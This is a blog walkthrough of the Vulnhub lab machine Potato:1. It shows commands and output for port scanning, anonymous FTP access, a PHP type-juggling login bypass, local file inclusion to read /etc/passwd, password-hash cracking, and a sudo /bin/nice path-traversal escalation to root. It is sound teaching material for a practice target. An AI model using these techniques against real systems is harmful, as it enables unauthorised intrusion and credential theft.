---
date: 2020-09-15 01:58:29
layout: post
title: "Potato 1 Vulnhub Walkthrough"
subtitle:
description: Potato:1 is a boot2root machine available on Vulnhub. This machine is good for beginners.
image: /assets/img/uploads/potato/potato.jpg
optimized_image: /assets/img/uploads/potato/potato-optimized.jpg
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: potato 1 writeup, potato 1 vulnhub, potato 1 walkthrough, potato vulnhub walkthrough, potato writeup, vulnhub potato walkthrough, potato writeup, infosec articles
---

Today I will be sharing a walkthrough of Potato:1 which is another boot to root machine available on Vulnhub. This includes bypassing a php login form and then exploiting a LFI to get a shell on the machine. This is a beginner machine and good for those who are just starting with Vulnhub. I have added the IP to my hosts file, So Let's Begin!

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/potato]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.44    potato.local
```

## Enumeration

I started the enumeration by running a full port scan using nmap to look for open ports and default scripts.

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/potato]                                                                                                           [2/22]
└─$ nmap -p- -sC -sV -oN nmap/all-ports potato.local
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 10:41 IST
Nmap scan report for potato.local (192.168.1.44)
Host is up (0.0035s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Potato company
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2 19:33 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2 18:17 welcome.msg
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```
We can see an Apache web server running on port 80 and a ProFTPD service running on port 2112. I started to enumerate FTP first because I saw that anonymous FTP login was allowed.

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/potato]
└─$ ftp potato.local 2112

Connected to potato.local.220 ProFTPD Server (Debian) [::ffff:192.168.1.44]
Name (potato.local:madhav): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.1.4 
230-
230-The local time is: Sun Sep 13 05:12:15 2020
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2 19:33 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2 18:17 welcome.msg
226 Transfer complete
```

After logging in, I found an index.php backup file and downloaded it to my local machine.

```r
ftp> get index.php.bak
local: index.php.bak remote: index.php.bak
200 PORT command successful
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
226 Transfer complete
901 bytes received in 0.00 secs (483.7179 kB/s)
```

After reading the <b>index.php.bak,</b> I found that it was the code for some login page, So I went to port 80 for further enumeration.

<img src="/assets/img/uploads/potato/port80.png">

We see nothing but just an image of potato. So next I started a gobuster scan to look for hidden directories.

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/potato]
└─$ gobuster dir -u http://potato.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://potato.local
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/09/13 10:40:23 Starting gobuster
===============================================================
/admin (Status: 301)
/potato (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/13 10:42:39 Finished
===============================================================
```
I found an admin directory where there is a login page.

<img src="/assets/img/uploads/potato/login.png">

I tried logging in with some random passwords but was not successful. So now let's have a look at the <b>index.php.bak</b> we found on FTP server.

<img src="/assets/img/uploads/potato/source.png">

In this we can see that the script uses <b>strcmp</b> function to compare the username supplied with <b>admin</b> and the password supplied with <b>$pass.</b> I found an exploit for the same scenario on <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">OWASP.</a>

<img src="/assets/img/uploads/potato/exploit.png">

I recommend spending a few minutes reading about "PHP Type Juggling" from <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">here.</a> I used Burp Suite to intercept the login request and changed the password field to an array.

<img src="/assets/img/uploads/potato/burp.png">

After logging in, we see a message which tells us to visit the dashboard page.

<img src="/assets/img/uploads/potato/admin.png">

There are a lot of things which can be tried here, after some enumeration, I found a LFI in the logs page. 

<img src="/assets/img/uploads/potato/dashboard.png">

It has a very simple functionality, It just retrieves the log files we request.

<img src="/assets/img/uploads/potato/logs.png">

I selected a log file and intercepted the request using Burp Suite. 

<img src="/assets/img/uploads/potato/burpsuite.png">

This time, instead of log1.txt, I retrieved <b>/etc/passwd.</b>

<img src="/assets/img/uploads/potato/passwd.png">

Next, I saved the password hash for user <b>webadmin</b> into a text file and used john to crack the password.

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/potato]
└─$ john pass.txt 
Created directory: /home/madhav/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
dragon           (?)
1g 0:00:00:00 DONE 2/3 (2020-09-13 11:14) 25.00g/s 9600p/s 9600c/s 9600C/s 123456..larry
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now we login into the machine via ssh using username <b>webadmin</b> and password <b>dragon.</b>

```r 
┌──(madhav㉿kali)-[~/Documents/vulnhub/potato]
└─$ ssh webadmin@potato.local
The authenticity of host 'potato.local (192.168.1.44)' cant be established.
ECDSA key fingerprint is SHA256:o2CcJVsxiCwKNOeMfbBTtdh0LpP1nTtNN53rYTYQn18.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'potato.local,192.168.1.44' (ECDSA) to the list of known hosts.
webadmin@potato.locals password:
webadmin@serv:~$ ls
user.txt
webadmin@serv:~$ cat user.txt 
TGUgY29udHLDtGxlIGVzdCDDoCBwZXUgcHLDqHMgYXVzc2kgcsOpZWwgcXXigJl1bmUg
```

## Root Shell

Obtaining a root shell is easy and just requires you to think out of the box. First, I checked if we can run any commands as sudo. 

```r
webadmin@serv:~$ sudo -l
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```

I found that we can run all the files in the <b>/notes</b> directory using <b>/bin/nice.</b> Then I checked the <b>/notes</b> and found that we do not have read or write permission on this directory.

```r
webadmin@serv:~$ cd /notes/
webadmin@serv:/notes$ ls -lah
total 16K
drwxr-xr-x  2 root root 4.0K Aug  2 19:11 .
drwxr-xr-x 21 root root 4.0K Aug  2 19:10 ..
-rwx------  1 root root   11 Aug  2 19:11 clear.sh
-rwx------  1 root root    8 Aug  2 19:11 id.sh
```

I went back to the home directory and created a script which executes <b>/bin/bash</b> and then this script using <b>/bin/nice</b> to get root.  

```r
webadmin@serv:~$ echo "/bin/bash" >> root.sh
webadmin@serv:~$ chmod +x root.sh
webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/root.sh 
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root)
```
And now we can read the root flag (The final flag is also base64 encoded xD)

```r
root@serv:/home/webadmin# cat /root/root.txt 
bGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==
```

That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/bdalke">Becca Dalke.</a>
